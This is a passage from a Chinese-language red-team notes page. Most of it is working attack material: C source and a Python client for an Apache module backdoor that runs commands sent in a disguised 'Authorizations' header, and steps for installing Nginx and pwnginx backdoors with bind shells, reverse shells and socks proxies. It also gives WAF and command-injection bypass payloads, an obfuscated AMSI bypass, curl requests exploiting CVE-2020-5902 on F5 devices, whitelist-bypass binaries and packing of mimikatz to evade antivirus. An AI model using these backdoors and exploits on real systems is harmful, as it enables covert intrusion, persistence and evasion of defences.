class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> fields<span class=\"token operator\">-></span>nelts<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Authorizations\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            FLAG <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FLAG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> command <span class=\"token operator\">=</span> e<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>val<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        FILE<span class=\"token operator\">*</span> fp <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">int</span> counter <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            counter <span class=\"token operator\">=</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token function\">ap_rwrite</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> counter<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">pclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> DONE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> DECLINED<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">auth_register_hooks</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">apr_pool_t</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token function\">ap_hook_handler</span><span class=\"token punctuation\">(</span>auth_handler<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> APR_HOOK_MIDDLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>module AP_MODULE_DECLARE_DATA auth_module <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    STANDARD20_MODULE_STUFF<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                  <span class=\"token comment\">/* create per-dir    config structures */</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                  <span class=\"token comment\">/* merge  per-dir    config structures */</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                  <span class=\"token comment\">/* create per-server config structures */</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                  <span class=\"token comment\">/* merge  per-server config structures */</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                  <span class=\"token comment\">/* table of config file commands       */</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    auth_register_hooks  <span class=\"token comment\">/* register hooks                      */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>编译后重启apache\n&gt;apxs -i -a -c mod_auth.c &amp;&amp; service apache2 restart\n</code></pre>\n<p><img data-src=\"621.png\" alt=\"\" /></p>\n<pre><code>原文件接受的头是backdoor太明显，这里换成了Authorizations\n</code></pre>\n<p><img data-src=\"622.png\" alt=\"\" /></p>\n<pre><code>或使用python来执行\n</code></pre>\n<p><img data-src=\"623.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token string\">\"Authorizations\"</span><span class=\"token punctuation\">:</span> command</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://%s:%d/\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    content <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>content</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span> content</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Usage : \"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"\\tpython %s [HOST] [PORT]\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    host <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        command <span class=\"token operator\">=</span> <span class=\"token builtin\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$ \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> command <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        exploit<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"apache-module后门2\"><a class=\"anchor\" href=\"#apache-module后门2\">#</a> Apache Module 后门 2</h3>\n<pre><code>From:https://github.com/VladRico/apache2_BackdoorMod\n.load文件传入/etc/apache2/mods-available/目录，.so文件传入/usr/lib/apache2/modules/目录\n启动后门模块，重启apache\n&gt;a2enmod backdoor&amp;service apache2 restart\n</code></pre>\n<p><img data-src=\"624.png\" alt=\"\" /></p>\n<pre><code>Cookie里添加字段password=backdoor\n访问http://ip/ping返回如下图说明后门正常允许\n</code></pre>\n<p><img data-src=\"625.png\" alt=\"\" /></p>\n<pre><code>访问http://ip/bind/12345 开启正向连接，攻击机执行nc ip 12345即可\n</code></pre>\n<p><img data-src=\"626.png\" alt=\"\" /></p>\n<pre><code>访问http://ip/revtty/192.168.0.107/12138 开启反向连接，攻击机109执行nc监听12138即可\n</code></pre>\n<p><img data-src=\"627.png\" alt=\"\" /></p>\n<pre><code>访问http://ip/proxy/1337开启socks代理\n</code></pre>\n<p><img data-src=\"628.png\" alt=\"\" /><br />\n<img data-src=\"629.png\" alt=\"\" /><br />\n<img data-src=\"630.png\" alt=\"\" /></p>\n<pre><code>想要结束socks代理可执行\n&gt;echo &quot;imdonewithyou&quot; |nc 192.168.0.111 1337\n</code></pre>\n<p><img data-src=\"631.png\" alt=\"\" /></p>\n<pre><code>即可结束socks代理\n以上原作者的文件命名backdoor太明显，可以自己修改文件重新编译\n创建模板结构命名为phpmodev\n</code></pre>\n<p><img data-src=\"632.png\" alt=\"\" /><br />\n<img data-src=\"633.png\" alt=\"\" /></p>\n<pre><code>修改cookie内容为迷惑字段Authorizations=PHPSESSIONID\n</code></pre>\n<p><img data-src=\"634.png\" alt=\"\" /></p>\n<h3 id=\"apache-module后门3\"><a class=\"anchor\" href=\"#apache-module后门3\">#</a> Apache Module 后门 3</h3>\n<pre><code>From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247491179&amp;idx=1&amp;sn=ab26fe36ac74f5b140e91279ae8018c7\n生成模板结构\n&gt;apxs -g -n phpdevmod\n</code></pre>\n<p><img data-src=\"635.png\" alt=\"\" /></p>\n<pre><code>编辑mod_phpdevmod.c文件\n编译\n&gt;make -e CC=x86_64-linux-gnu-g++\n</code></pre>\n<p><img data-src=\"636.png\" alt=\"\" /></p>\n<pre><code>生成的.so文件在/.libs目录下\n</code></pre>\n<p><img data-src=\"637.png\" alt=\"\" /></p>\n<pre><code>将其复制到/usr/lib/apache2/modules/目录\n修改/etc/apache2/mods-enabled/php7.0.load文件，添加如下\nLoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so\n&lt;Location /qq.jpg&gt;    #可以设置为任何不存在的文件\n\tsetHandler phpdevmod\n&lt;/Location&gt;\n</code></pre>\n<p><img data-src=\"638.png\" alt=\"\" /></p>\n<pre><code>需重启apache服务\n访问后门方式http://ip/qq.jpg?命令的url编码\n直接访问后门文件\n</code></pre>\n<p><img data-src=\"639.png\" alt=\"\" /></p>\n<pre><code>636174202F6574632F706173737764为cat /etc/passwd的url编码\n</code></pre>\n<p><img data-src=\"640.png\" alt=\"\" /></p>\n<h3 id=\"nginx-lua后门\"><a class=\"anchor\" href=\"#nginx-lua后门\">#</a> Nginx Lua 后门</h3>\n<pre><code>From:https://github.com/netxfly/nginx_lua_security\nhttps://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md\n后门利用的前提是获取到root权限，nginx安装有lua模块。\n在nginx.conf中http节处添加，指定lua脚本位置，以及nginx启动时加载的脚本\n</code></pre>\n<p><img data-src=\"641.png\" alt=\"\" /></p>\n<pre><code>在lua目录/waf/中新建Init.lua，内容如下，require nginx表示加载nginx.lua中的模块。\n</code></pre>\n<p><img data-src=\"642.png\" alt=\"\" /></p>\n<pre><code>/waf/目录中新建nginx.lua实现执行命令，参数为waf。\n</code></pre>\n<p><img data-src=\"643.png\" alt=\"\" /></p>\n<pre><code>在nginx配置文件中加入location。\n</code></pre>\n<p><img data-src=\"644.png\" alt=\"\" /></p>\n<pre><code>效果：\n</code></pre>\n<p><img data-src=\"645.png\" alt=\"\" /></p>\n<h3 id=\"pwnnginx\"><a class=\"anchor\" href=\"#pwnnginx\">#</a> PwnNginx</h3>\n<pre><code>From:https://github.com/t57root/pwnginx\n解压好后编译客户端\n&gt;make\n</code></pre>\n<p><img data-src=\"646.png\" alt=\"\" /></p>\n<pre><code>编辑nginx的源文件/src/core/nginx.c找到configure arguments:在后面添加--prefix=/usr/local/nginx\\n指定的是nginx安装的目录\n</code></pre>\n<p><img data-src=\"647.png\" alt=\"\" /></p>\n<pre><code>重新编译nginx添加后门模块\n&gt;./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module\n</code></pre>\n<p><img data-src=\"648.png\" alt=\"\" /></p>\n<pre><code>&gt;make\n</code></pre>\n<p><img data-src=\"649.png\" alt=\"\" /></p>\n<pre><code>覆盖新的nginx到原nginx目录\n&gt;cp -f objs/nginx /usr/local/nginx/sbin/nginx\n</code></pre>\n<p><img data-src=\"650.png\" alt=\"\" /></p>\n<pre><code>重启nginx\n&gt;killall nginx&amp;/usr/local/nginx/sbin/nginx\n连接\n&gt;./pwnginx shell 目标机 nginx端口 密码\n默认密码是t57root，密码的配置文件在pwnginx-master\\module\\config.h文件夹中，可在重新编译nginx前修改密码\n</code></pre>\n<p><img data-src=\"651.png\" alt=\"\" /><br />\n<img data-src=\"652.png\" alt=\"\" /></p>\n<pre><code>此后门也可开启socks隧道\n</code></pre>\n<h1 id=\"渗透和红队tips\"><a class=\"anchor\" href=\"#渗透和红队tips\">#</a> 渗透和红队 tips</h1>\n<h2 id=\"父进程破坏\"><a class=\"anchor\" href=\"#父进程破坏\">#</a> 父进程破坏</h2>\n<pre><code>命令explorer.exe / root与cmd.exe / c类似，只不过使用explorer会破坏进程树，会创建新实例explorer.exe，使之成为新实例下的子进程\n</code></pre>\n<p><img data-src=\"665.png\" alt=\"\" /><br />\n<img data-src=\"666.png\" alt=\"\" /></p>\n<h2 id=\"lot高频率账户密码\"><a class=\"anchor\" href=\"#lot高频率账户密码\">#</a> loT 高频率账户密码</h2>\n<p><img data-src=\"678.png\" alt=\"\" /></p>\n<h2 id=\"bypass-mod_security\"><a class=\"anchor\" href=\"#bypass-mod_security\">#</a> Bypass mod_security</h2>\n<pre><code>Xss和注入bypass mod_security\n/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4... –\n&lt;marquee loop=1 width=0 onfinish=pr\\u006fmpt(document.cookie)&gt;Y000&lt;/marquee&gt;\n/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5—\n%75%6e%69on = union \n%73%65%6cect = select \n%75%6e%69 = uni = url encode \n%73%65%6c = sel = url encode\n</code></pre>\n<h2 id=\"查找git和svn的字典\"><a class=\"anchor\" href=\"#查找git和svn的字典\">#</a> 查找 git 和 svn 的字典</h2>\n<p><img data-src=\"679.jpg\" alt=\"\" /></p>\n<h2 id=\"top-25-重定向dorks\"><a class=\"anchor\" href=\"#top-25-重定向dorks\">#</a> Top 25 重定向 dorks</h2>\n<p><img data-src=\"680.jpg\" alt=\"\" /></p>\n<h2 id=\"使用grep快速去除垃圾数据\"><a class=\"anchor\" href=\"#使用grep快速去除垃圾数据\">#</a> 使用 grep 快速去除垃圾数据</h2>\n<pre><code>curl http://host.xx/file.js | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*\ncat file | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*\n</code></pre>\n<p><img data-src=\"684.png\" alt=\"\" /><br />\n<img data-src=\"685.png\" alt=\"\" /></p>\n<h2 id=\"已泄露的密码整理出的字典\"><a class=\"anchor\" href=\"#已泄露的密码整理出的字典\">#</a> 已泄露的密码整理出的字典</h2>\n<pre><code>https://github.com/FlameOfIgnis/Pwdb-Public\n从网上泄露的10亿条数据中整理出的。里面257,669,588被筛选为损坏的数据或测试账户。\n10亿个凭据可归结为168,919,919密码和393,386,953用户名.\n平均密码长度为9.4822个字符\n12.04%包含特殊字符，28.79%密码仅是字母，26.16%仅是小写，13.37%仅是数字，8.83%的密码仅被发现一次\n与rockyou的对比，rockyou包含14,344,391个密码，本字典与rockyou相差80%\n还有根据不同国家生成的小字典\n</code></pre>\n<h2 id=\"命令注入bypass\"><a class=\"anchor\" href=\"#命令注入bypass\">#</a> 命令注入 Bypass</h2>\n<pre><code>From: @shreyasrx\ncat /etc/passwd \ncat /e&quot;t&quot;c/pa&quot;s&quot;swd \ncat /'e'tc/pa's' swd \ncat /etc/pa??wd \ncat /etc/pa*wd \ncat /et' 'c/passw' 'd \ncat /et$()c/pa$()$swd\ncat /et$&#123;neko&#125;c/pas$&#123;poi&#125; swd \n*echo &quot;dwssap/cte/ tac&quot; | rev \n$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d) \nw\\ho\\am\\i \n/\\b\\i\\n/////s\\h \nwho$@ami \nxyz%0Acat%20/etc/passwd \nIFS=,;`cat&lt;&lt;&lt;uname,-a`\n/???/??t /???/p??s?? \ntest=/ehhh/hmtc/pahhh/hmsswd \ncat $&#123;test//hhh\\/hm/&#125; \ncat $&#123;test//hh??hm/&#125;\ncat /???/?????d\n&#123;cat,/etc/passwd&#125;\n</code></pre>\n<h2 id=\"查询是否存在heartbleed漏洞\"><a class=\"anchor\" href=\"#查询是否存在heartbleed漏洞\">#</a> 查询是否存在 heartbleed 漏洞</h2>\n<pre><code>cat list.txt | while read line ; do echo &quot;QUIT&quot; | openssl s_client -connect $line:443 2&gt;&amp;1 | grep 'server extension &quot;heartbeat&quot; (id=15)' || echo $line: safe; done\n</code></pre>\n<p><img data-src=\"712.png\" alt=\"\" /></p>\n<h2 id=\"远程解压文件\"><a class=\"anchor\" href=\"#远程解压文件\">#</a> 远程解压文件</h2>\n<pre><code>pip install remotezip\n#列出远程压缩包文件内容\nremotezip -l http://site/bigfile.zip\n#解压里面的文件\nremotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot;\n</code></pre>\n<h2 id=\"top25-ssrf-dorks\"><a class=\"anchor\" href=\"#top25-ssrf-dorks\">#</a> Top25 ssrf dorks</h2>\n<p><img data-src=\"714.jpg\" alt=\"\" /></p>\n<h2 id=\"使用securitytrails-api查询子域名\"><a class=\"anchor\" href=\"#使用securitytrails-api查询子域名\">#</a> 使用 SecurityTrails API 查询子域名</h2>\n<pre><code>去https://securitytrails.com/申请个免费的API\ncurl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\\&quot;//g' &gt;test.txt 2&gt;/dev/null &amp;&amp; sed &quot;s/$/.target.com/&quot; test.txt | sed 's/ //g' &amp;&amp; rm test.txt\n</code></pre>\n<p><img data-src=\"715.png\" alt=\"\" /></p>\n<h2 id=\"邮件地址payload\"><a class=\"anchor\" href=\"#邮件地址payload\">#</a> 邮件地址 payload</h2>\n<pre><code>XSS\ntest+(&lt;script&gt;alert(0)&lt;/script&gt;)@example.com\ntest@example(&lt;script&gt;alert(0)&lt;/script&gt;).com\n&quot;&lt;script&gt;alert(0)&lt;/script&gt;&quot;@example.com\nSSTI\n&quot;&lt;%= 7 * 7 %&gt;&quot;@example.com\ntest+($&#123;&#123;7*7&#125;&#125;)@example.com\nSQL injection\n&quot;' OR 1=1 -- '&quot;@example.com \n&quot;mail'); --&quot;@example.com\nSSRF\njohn.doe@abc123.dnslog.cn\njohn.doe@[127.0.0.1]\n头注入\n&quot;%0d%0aContent-Length:%200%0d%0a%0d%0a&quot;@example.com\n&quot;recipient@test.com&gt;\\r\\nRCPT TO:&lt;victim+&quot;@test.com\n</code></pre>\n<h2 id=\"web-server日志分析命令\"><a class=\"anchor\" href=\"#web-server日志分析命令\">#</a> Web server 日志分析命令</h2>\n<pre><code>https://gist.github.com/hvelarde/ceac345c662429447959625e6feb2b47\n通过状态码获取请求总数\nawk '&#123;print $9&#125;' /var/log/apache2/access.log | sort | uniq -c | sort –rn\n</code></pre>\n<p><img data-src=\"716.png\" alt=\"\" /></p>\n<pre><code>按照IP的请求数量排序\nawk '&#123;print $1&#125;' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head | awk -v OFS='\\t' '&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;'\n</code></pre>\n<p><img data-src=\"717.png\" alt=\"\" /></p>\n<pre><code>按照ua的请求数量排序\nawk -F'&quot;' '&#123;print $6&#125;' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head\n</code></pre>\n<p><img data-src=\"718.png\" alt=\"\" /></p>\n<pre><code>按照url的请求数量排序\nawk '&#123;print $7&#125;' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head\n</code></pre>\n<p><img data-src=\"719.png\" alt=\"\" /></p>\n<pre><code>按照请求页面为404的url排序\nawk '$9 ~ /404/ &#123;print $7&#125;' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head\n按照请求致后端报错的IP排序\nawk '$0 ~ /\\[error\\]/ &amp;&amp; match($0, /(client: )(.*)(, server)/, arr) &#123;print arr[2]&#125;' /var/log/apache2/error.log | sort | uniq -c | sort -rn | awk -v OFS='\\t' '&#123;&quot;host &quot; $2 | getline ip; print $0, ip&#125;'\n获取最近10分钟的请求\nawk -v date=$(date +[%d/%b/%Y:%H:%M --date=&quot;-10 minutes&quot;) '$4 &gt; date' /var/log/nginx/access.log\n</code></pre>\n<h2 id=\"bypass-amsi\"><a class=\"anchor\" href=\"#bypass-amsi\">#</a> Bypass AMSI</h2>\n<pre><code>$a =[Ref].Assembly.GetType('System.Management.Automation.AmsiUt'+'ils')\n$h=&quot;4456625220575263174452554847&quot;\n$s =[string](0..13|%&#123;[char][int](53+($h).substring(($_*2),2))&#125;)-replace &quot; &quot;\n$b =$a.GetField($s,'NonPublic,Static')\n$b.SetValue($null,$true)\n</code></pre>\n<p><img data-src=\"720.png\" alt=\"\" /></p>\n<h2 id=\"bypass-amsi-2\"><a class=\"anchor\" href=\"#bypass-amsi-2\">#</a> Bypass AMSI 2</h2>\n<pre><code>https://github.com/crawl3r/FunWithAMSI\n直接编译完使用即可\n[System.Reflection.Assembly]::LoadFile(&quot;C:\\\\Users\\\\test\\\\Desktop\\\\AmsiFun.dll&quot;)\n[Amsi]::Bypass()\n</code></pre>\n<p><img data-src=\"726.png\" alt=\"\" /><br />\n<img data-src=\"727.png\" alt=\"\" /><br />\n<img data-src=\"728.png\" alt=\"\" /></p>\n<h2 id=\"cve-2020-5902\"><a class=\"anchor\" href=\"#cve-2020-5902\">#</a> CVE-2020-5902</h2>\n<pre><code>F5 BIG-IP TMUI RCE\nhttps://raw.githubusercontent.com/jas502n/CVE-2020-5902/master/CVE-2020-5902.py\nRCE\ncurl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'\n读文件\ncurl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'\n执行Linux命令\n/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash\n/fileSave.jsp?fileName=/tmp/cmd&amp;content=id\n/tmshCmd.jsp?command=list+/tmp/cmd\n/tmshCmd.jsp?command=delete+cli+alias+private+list\n</code></pre>\n<h2 id=\"一些可尝试绕过白名单的执行\"><a class=\"anchor\" href=\"#一些可尝试绕过白名单的执行\">#</a> 一些可尝试绕过白名单的执行</h2>\n<pre><code>forfiles /p c:\\windows\\system32 /m notepad.exe /c &lt;bin&gt; \nexplorer.exe /root,&quot;&lt;bin&gt;&quot; \npcalua.exe -a &lt;bin&gt; \nscriptrunner.exe -appvscript &lt;bin&gt; \nwmic process call create &lt;bin&gt; \nrundll32.exe advpack.dll, RegisterOCX &lt;bin&gt;\n</code></pre>\n<h2 id=\"绕过lsa-protection\"><a class=\"anchor\" href=\"#绕过lsa-protection\">#</a> 绕过 lsa protection</h2>\n<pre><code>https://github.com/RedCursorSecurityConsulting/PPLKiller\n</code></pre>\n<p><img data-src=\"733.png\" alt=\"\" /><br />\n<img data-src=\"734.png\" alt=\"\" /><br />\n<img data-src=\"735.png\" alt=\"\" /><br />\n<img data-src=\"736.png\" alt=\"\" /><br />\n<img data-src=\"737.png\" alt=\"\" /></p>\n<h2 id=\"pezor免杀\"><a class=\"anchor\" href=\"#pezor免杀\">#</a> Pezor 免杀</h2>\n<pre><code>使用inline_syscall内联注入shellcode，结合sgn，donut等项目，增加了一些反调试技巧\nhttps://github.com/phra/PEzor\n$ git clone https://github.com/phra/PEzor.git \n$ cd PEzor \n$ sudo bash install.sh \n$ bash PEzor.sh –h\n这里测试下mimikatz，-sleep设置为2分钟，执行后需等两分钟\n打包之前\n</code></pre>\n<p><img data-src=\"738.png\" alt=\"\" /></p>\n<pre><code>打包之后\n</code></pre>\n<p><img data-src=\"739.png\" alt=\"\" /><br />\n<img data-src=\"740.png\" alt=\"\" /><br />\n<img data-src=\"741.png\" alt=\"\" /></p>\n<pre><code>测试下Covenant\n</code></pre>\n<p><img data-src=\"742.png\" alt=\"\" /><br />\n<img data-src=\"743.png\" alt=\"\" /><br />\n<img data-src=\"744.png\" alt=\"\" /></p>\n<h2 id=\"动态调用进程注入逻辑\"><a class=\"anchor\" href=\"#动态调用进程注入逻辑\">#</a> 